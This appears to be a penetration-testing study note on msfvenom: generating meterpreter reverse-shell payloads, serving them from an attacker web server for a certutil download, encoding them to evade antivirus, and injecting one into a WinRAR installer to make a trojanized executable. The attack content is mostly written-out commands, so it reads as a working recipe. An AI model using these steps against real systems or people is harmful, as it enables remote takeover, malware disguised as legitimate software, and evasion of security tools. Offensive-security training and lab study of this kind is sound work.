# i - Payloads

## Generating Payloads With Msfvenom

**Client-side Attacks**

* A client-side attack is an attack vector that involves coercing a client to execute a malicious payload on their system that consequently connects back to the attacker when executed.
* Client-side attacks typically utilize various social engineering techniques like generating malicious documents or portable executables (PEs).
* Client-side attacks take advantage of human vulnerabilities as opposed to vulnerabilities in services or software running on the target system.
* Given that this attack vector involves the transfer and storage of a malicious payload on the client's system (disk), attackers need to be cognisant of AV detection.

### **Msfvenom**

* Msfvenom is a command line utility that can be used to generate and encore MSF payloads for various operating systems as well as web servers.
* Msfvenom is a combination of two utilities, namely; msfpayload and msfencode.
* We can use Msfvenom to generate a malicious meterpreter payload that can be transferred to a client target system. Once executed, it will connect back to our payload handler and provide us with remote access to the target system.

## **Practical Demonstration**

```bash
msfvenom -h # Open the msfvenom help page.
msfvenom --list payloads # List every Msfvenom payloads.
msfvenom --list formats # List every format Msfvenom can generate payloads with

# windows/x64/meterpreter/reverse_tcp is a staged payload.
# windows/x64/meterpreter_reverse_tcp is a non-staged payload.

msfvenom -a <x86 or x64> -p <payload> LHOST=$kali_ip LPORT=<localPort> -f exe > /home/kali/Desktop/payload.exe #Generate a payload with Msfvenom.

# We then have to transfer the payload to the target system and setup a listener to connect to it
# In Kali:
sudo python -m SimpleHTTPServer 80 #Start a web server in the current directory
msf5 > use multi/handler #Set up a listener
# In target system:
CMD > certutil -urlcache -f http://<localIP>/<file> <file> #Download the payload from the Kali HTTP server and execute it
# You then should receive a shell on your Kali!.
```



## Encoding Payloads With Msfvenom

**Encoding Payloads With Msfvenom**

* Given that this attack vector involves the transfer and storage of a malicious payload on the client's system (disk), attackers need to be cognisant of AV detection.
* Most end user AV solutions utilize signature based detection in order to identify malicious files or executables.
* We can evade older signature based AV solutions by encoding our payloads.
* Encoding is the process of modifying the payload shellcode with the objective of modifying the payload signature.

**Shellcode**

* Shellcode (shell-code) is a piece of code typically used as a payload for exploitation.
* It gets it's name from the term command shell, whereby shellcode is a piece of code that provides an attacker with a remote command shell on the target system.

## **Practical Demonstration**

```bash
msfvenom --list encoders #List every Msfvenom encoders
msfvenom <...> -e <encoderName> <...> #Generate a payload and encode it.

#The more you encode a payload (number of iterations), the more you will have chances to succeed AV evasion. More than 10 will not to a lot though.
msfvenom <...> -i <numberOfIterations> -e <encoderName> <...> #Generate and encode a payload with more a specified number of iterations.
```



## Injecting Payloads Into Windows Portable Executables

### **Practical Demonstration**

```bash
msfvenom <...> -x <pathToPE> <...> #Inject the payload into a portable executable
# You can use the -k flag so the PE will execute as intended in addition to execute the payload BUT this will not work for most PEs

# The process
# we will be using the "winrar" application for windows.
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$kaliIP LPORT=1234 -e x86/shikata_ga_nai -i 10 -f exe -x ~/Downloads/winrar602.exe > winrar.exe
# transfer the "winrar.exe" to the victim.
# this will just run the payload when executed without running the actual setup, to get the file to run the actual setup, we have tospecify the "-k" option.

# in case of windows, we can use the [post/windows/manage/migrate] modult to migrate our session into another process in order for use to maintain access if the victim terminates the process.
msf6 > use post/windows/manage/migrate
```









